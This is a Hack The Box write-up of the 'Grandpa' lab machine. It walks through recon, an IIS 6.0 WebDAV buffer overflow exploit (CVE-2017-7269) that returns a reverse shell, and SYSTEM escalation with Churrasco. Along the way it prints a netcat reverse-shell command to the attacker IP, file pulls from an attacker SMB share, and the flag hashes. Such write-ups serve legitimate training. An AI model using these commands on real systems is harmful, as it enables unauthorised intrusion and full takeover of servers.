---
title: "HTB: Grandpa [Easy]"
date: 2025-12-27 00:00 +0800
categories: [HTB]
tags: [HTB, Easy, Windows, IIS, CVE-2017-7269, SeImpersonatePrivilege]
image: https://github.com/user-attachments/assets/5585801b-9020-4749-830e-dc2bb61da05d
---

<img width="873" height="351" alt="image" src="https://github.com/user-attachments/assets/5585801b-9020-4749-830e-dc2bb61da05d" />

My second Windows box on HTB, which deepened my understanding of Windows privilege escalation techniques. Learning how Churrasco exploits `SeImpersonatePrivilege` to steal SYSTEM tokens (like stealing root's tmux session in Linux) was eye-opening. Great practice for understanding Windows token-based authentication and why service account privileges matter.

## Tools

- nmap
- searchsploit
- davtest
- penelope
- impacket-smbserver
- churrasco.exe
- nc.exe

## Recon

nmap scan result:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Grandpa]
└─$ nmap -sCV -p- -T4 -oA nmap/ 10.10.10.14 -vvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-27 15:31 +08
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Initiating Ping Scan at 15:31
Scanning 10.10.10.14 [4 ports]
Completed Ping Scan at 15:31, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:31
Completed Parallel DNS resolution of 1 host. at 15:31, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:31
Scanning 10.10.10.14 [65535 ports]
Discovered open port 80/tcp on 10.10.10.14
SYN Stealth Scan Timing: About 22.30% done; ETC: 15:33 (0:01:48 remaining)
SYN Stealth Scan Timing: About 58.27% done; ETC: 15:32 (0:00:44 remaining)
Completed SYN Stealth Scan at 15:32, 88.29s elapsed (65535 total ports)
Initiating Service scan at 15:32
Scanning 1 service on 10.10.10.14
Completed Service scan at 15:32, 6.03s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.14.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:32
Completed NSE at 15:32, 5.04s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:32
Completed NSE at 15:32, 0.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
Nmap scan report for 10.10.10.14
Host is up, received echo-reply ttl 127 (0.019s latency).
Scanned at 2025-12-27 15:31:14 +08 for 100s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Sat, 27 Dec 2025 07:02:44 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.87 seconds
           Raw packets sent: 131141 (5.770MB) | Rcvd: 85 (4.856KB)
```
This Nmap scan shows that it's Windows machine running Microsoft IIS 6.0 on port 80, with WebDAV enabled and many risky HTTP methods allowed.

By default we run davtest because WebDAV often allows file upload, and davtest quickly checks whether we can upload, execute, or interact with files on the server, which is a common and easy path to initial access. So here's the scan result.

This reminds me a lot of Granny box with the nmap scan result. However, nothing enabled from davtest scan result:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Grandpa]
└─$ davtest -url 10.10.10.14
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                10.10.10.14
********************************************************
NOTE    Random string for this session: jGbc6SQ2bX
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     pl      FAIL
PUT     html    FAIL
PUT     txt     FAIL
PUT     shtml   FAIL
PUT     cfm     FAIL
PUT     php     FAIL
PUT     aspx    FAIL
PUT     jsp     FAIL
PUT     cgi     FAIL
PUT     jhtml   FAIL
PUT     asp     FAIL

********************************************************
/usr/bin/davtest Summary:
```

From nmap scan server header it's running `Microsoft-IIS/6.0`. We can try and find its known exploit by using searchsploit:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Grandpa]
└─$ searchsploit IIS 6.0
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                                                                                          | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                                                   | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                                                     | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                                                              | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                                                    | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                                                  | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                                                                                   | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                                               | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                                               | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                                           | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                                                  | windows/remote/19033.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
We find that this version exploitable with **WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow**. This might be exploitable vuln for our machine. 

I've tried payload `windows/remote/41738.py` from searchsploit and module `exploit/windows/iis/iis_webdav_scstoragepathfromurl` from metasploit. However both had an issues and failed me, so i decide to find publicly available POC for this **[CVE-201707269](https://github.com/geniuszly/CVE-2017-7269/)** 

Setup a listener
```
┌──(kali㉿kali)-[~/Desktop/HTB/Grandpa]                                                                                                                                                                                                     
└─$ penelope                                                                                                                                                                                                                                
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.134.128 • 172.18.0.1 • 172.17.0.1 • 10.10.16.6                                                                                                                      
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)                                                                                                                                                                    
```

Trigger the payload 
```
┌──(kali㉿kali)-[~/Desktop/HTB/Grandpa]
└─$ python3 GenWebDavIISExploit.py 10.10.10.14 80 10.10.16.6 4444                                                     
[*] Подключение к цели 10.10.10.14 на порту 80...          
[*] Отправка специально сформированного HTTP-запроса для эксплуатации уязвимости...                                  [*] Длина полезной нагрузки: 1744 байт                      
[*] Ожидание обратного соединения...                       
```
## Shell as Network Service
```
┌──(kali㉿kali)-[~/Desktop/HTB/Grandpa]                    
└─$ penelope                                               
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.134.128 • 172.18.0.1 • 172.17.0.1 • 10.10.16.6 
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)                                              
[+] Got reverse shell from GRANPA~10.10.10.14-Microsoft(R)_Windows(R)_Server_2003,_Standard_Edition-X86-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/GRANPA~10.10.10.14-Microsoft(R)_Windows(R)_Server_2003,_Standard_Edition-X86-based_PC/2025_12_27-16_07_48-773.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 

c:\windows\system32\inetsrv>whoami
whoami                                                     
nt authority\network service                               
```

### Discovery 

There's multiple users but there's 2 unique for me which **Administrator** and **Harry**. 
```
c:\windows\system32\inetsrv>net user                                                                                                                                                                                                        
net user                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
User accounts for \\GRANPA                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
-------------------------------------------------------------------------------                                                                                                                                                             
Administrator            ASPNET                   Guest                                                                                                                                                                                     
Harry                    IUSR_GRANPA              IWAM_GRANPA                                                                                                                                                                               
SUPPORT_388945a0                                                                                                                                                                                                                            
The command completed successfully.                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
```
However, i dont have access to both of the users.

```
C:\Documents and Settings>dir                              
dir                                                        
 Volume in drive C has no label.                 
 Volume Serial Number is FDCB-B9EF           
                                                           
 Directory of C:\Documents and Settings            
                                                           
04/12/2017  04:32 PM    <DIR>          .           
04/12/2017  04:32 PM    <DIR>          ..          
04/12/2017  04:12 PM    <DIR>          Administrator
04/12/2017  04:03 PM    <DIR>          All Users
04/12/2017  04:32 PM    <DIR>          Harry  
               0 File(s)              0 bytes     
               5 Dir(s)   1,317,441,536 bytes free 
                                                           
C:\Documents and Settings>cd Harry                
cd Harry                                                   
Access is denied.                                          
                                                           
C:\Documents and Settings>cd Administrator         
cd Administrator                                           
Access is denied.                                          
```
We find there's `SeImpersonatePrivilege` **enabled** that could be abused to PE as Local System. Can learn more on how to PE with `SeImpersonatePrivilege` from **[here](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#summary)**.

However, most of them was for **Microsoft IIS Version 2007>**. From **Granny** machine we learned that we can use **[Churrasco](https://github.com/Re4son/Churrasco/)** for **IIS/6.0 - 2003**.

> As someone more familiar with Linux/Kali architecture, here's how I understand this exploit. 
> Churrasco steals SYSTEM's authentication token from memory (like copying root's tmux session token) and uses it to run commands as SYSTEM.
```
C:\wmpub>whoami /priv                                                                                                                                                                                                                       
whoami /priv                                                                                                                                                                                                                                
                                                                                                                                                                                                                                            
PRIVILEGES INFORMATION                                                                                                                                                                                                                      
----------------------                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Privilege Name                Description                               State                                                                                                                                                               
============================= ========================================= ========                                                                                                                                                            
SeAuditPrivilege              Generate security audits                  Disabled                                                                                                                                                            
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                                                                                                                                            
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                                                                                                                                            
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                                                                                                             
SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                                                                                                                             
SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                                                                                                             
```
Setup our own **smbserver** by using **impacket** 
```
┌──(kali㉿kali)-[~/Desktop/HTB/Grandpa]                                                                                                                                                                                                     
└─$ impacket-smbserver SHARE .                                                                                                                                                                                                              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                  
                                                                                                                                                                                                                                            
[*] Config file parsed                                                                                                                                                                                                                      
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                                                                                                                                                      
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                                                                                                                                                      
[*] Config file parsed                                                                                                                                                                                                                      
[*] Config file parsed                                                                                                                                                                                                                      
```
We find **wmpub** directory at **root** which quite unusual and tested that we had write access there. Bring the `churrasco.exe` and `nc.exe` to the machine. 
```
C:\wmpub>copy \\10.10.16.6\share\c.exe
copy \\10.10.16.6\share\c.exe 
        1 file(s) copied.

C:\wmpub>copy \\10.10.16.6\share\nc.exe                    
copy \\10.10.16.6\share\nc.exe
        1 file(s) copied.
```
Don't forget, the listener
```
──(kali㉿kali)-[~/Desktop/HTB/Grandpa]                                                                                                                                                                                   16:24:56 [172/172]
└─$ penelope -p 4455                                                                                                  
[+] Listening for reverse shells on 0.0.0.0:4455 →  127.0.0.1 • 192.168.134.128 • 172.18.0.1 • 172.17.0.1 • 10.10.16.6
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)                                              
```
The `-d` flag tells Churrasco to execute our custom command (netcat reverse shell) instead of just spawning cmd.exe.
```
C:\wmpub>.\c.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.16.6 4455"
.\c.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.16.6 4455"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```
## Shell as System
We should get shell:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Grandpa]                                                                                                                                                                                   16:24:56 [172/172]
└─$ penelope -p 4455                                                                                                  
[+] Listening for reverse shells on 0.0.0.0:4455 →  127.0.0.1 • 192.168.134.128 • 172.18.0.1 • 172.17.0.1 • 10.10.16.6
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)                                              
[+] Got reverse shell from GRANPA~10.10.10.14-Microsoft(R)_Windows(R)_Server_2003,_Standard_Edition-X86-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...                                                                                         
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D                                              
[+] Logging to /home/kali/.penelope/sessions/GRANPA~10.10.10.14-Microsoft(R)_Windows(R)_Server_2003,_Standard_Edition-X86-based_PC/2025_12_27-16_24_53-347.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 

C:\WINDOWS\TEMP>whoami                                     
whoami                                                     
nt authority\system
```
### User flag
```
C:\Documents and Settings\Harry\Desktop>dir                
dir                                                        
 Volume in drive C has no label.                           
 Volume Serial Number is FDCB-B9EF                         

 Directory of C:\Documents and Settings\Harry\Desktop      

04/12/2017  04:32 PM    <DIR>          .                   
04/12/2017  04:32 PM    <DIR>          ..                  
04/12/2017  04:32 PM                32 user.txt            
               1 File(s)             32 bytes              
               2 Dir(s)   1,317,101,568 bytes free         

C:\Documents and Settings\Harry\Desktop>type user.txt      
type user.txt                                              
bdff5ec67c3cff017f2bedc146a5d869                           
C:\Documents and Settings\Harry\Desktop>                   
```
### Root flag
```
C:\Documents and Settings\Administrator\Desktop>dir        
dir                                                        
 Volume in drive C has no label.                           
 Volume Serial Number is FDCB-B9EF                         

 Directory of C:\Documents and Settings\Administrator\Desktop                                                         

04/12/2017  04:28 PM    <DIR>          .                   
04/12/2017  04:28 PM    <DIR>          ..                  
04/12/2017  04:29 PM                32 root.txt            
               1 File(s)             32 bytes              
               2 Dir(s)   1,317,097,472 bytes free         

C:\Documents and Settings\Administrator\Desktop>type root.txt                                                         
type root.txt                                              
9359e905a2c35f861f6a57cecf28bb7b                           
```

**[Badge](https://labs.hackthebox.com/achievement/machine/1737187/13)**
